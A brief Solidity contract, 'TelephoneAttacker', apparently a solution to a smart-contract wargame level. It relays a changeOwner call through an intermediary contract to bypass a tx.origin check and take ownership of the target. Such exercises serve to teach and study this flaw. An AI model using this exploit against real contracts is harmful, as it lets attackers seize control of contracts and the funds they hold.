// SPDX-License-Identifier: NOLICENCE
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttacker {
    Telephone telephone;

    constructor(address _target) {
        telephone = Telephone(_target);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}
